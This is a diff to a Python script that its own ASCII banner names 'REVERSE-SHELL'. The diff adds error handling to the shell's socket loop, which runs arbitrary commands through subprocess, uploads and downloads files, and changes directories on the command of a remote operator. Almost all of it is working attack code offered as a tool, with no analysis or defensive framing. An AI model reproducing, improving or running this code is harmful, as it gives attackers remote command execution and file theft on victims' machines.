@@ -1,17 +1,17 @@
 import socket
 import subprocess
 import os
-import sys  # Import sys module for command-line arguments
+import sys
 
 def main():
     # ASCII Art Banner
     banner = """
- ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
-██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
-██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗█████╗███████╗███████║█████╗  ██║     ██║     
-██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
+ ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗
+██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║
+██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗█████╗███████╗███████║█████╗  ██║     ██║
+██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║
 ██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗
-╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                                                                                                   
+╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
     """
     print(banner)
 
@@ -47,32 +47,44 @@ def main():
 
         elif command[:6] == 'upload':
             filename = command[7:]
-            with open(filename, 'wb') as f:
-                data = s.recv(4096)
-                while data:
-                    f.write(data)
+            try:
+                with open(filename, 'wb') as f:
                     data = s.recv(4096)
-            s.send(str.encode('File uploaded successfully\n'))
+                    while data:
+                        f.write(data)
+                        data = s.recv(4096)
+                s.send(str.encode('File uploaded successfully\n'))
+            except Exception as e:
+                s.send(str.encode(f'Error uploading file: {e}\n'))
 
         elif command[:8] == 'download':
             filename = command[9:]
             if os.path.exists(filename):
-                with open(filename, 'rb') as f:
-                    data = f.read(4096)
-                    while data:
-                        s.send(data)
+                try:
+                    with open(filename, 'rb') as f:
                         data = f.read(4096)
-                s.send(str.encode('File downloaded successfully\n'))
+                        while data:
+                            s.send(data)
+                            data = f.read(4096)
+                    s.send(str.encode('File downloaded successfully\n'))
+                except Exception as e:
+                    s.send(str.encode(f'Error downloading file: {e}\n'))
             else:
                 s.send(str.encode('File not found\n'))
 
         elif command[:2] == 'cd':
-            os.chdir(command[3:])
-            s.send(str.encode(os.getcwd() + '> '))
+            try:
+                os.chdir(command[3:])
+                s.send(str.encode(os.getcwd() + '> '))
+            except Exception as e:
+                s.send(str.encode(f'Error changing directory: {e}\n'))
 
         else:
-            output = subprocess.getoutput(command)
-            s.send(str.encode(output + '\n'))
+            try:
+                output = subprocess.getoutput(command)
+                s.send(str.encode(output + '\n'))
+            except Exception as e:
+                s.send(str.encode(f'Error executing command: {e}\n'))
 
     # Close the connection
     s.close()
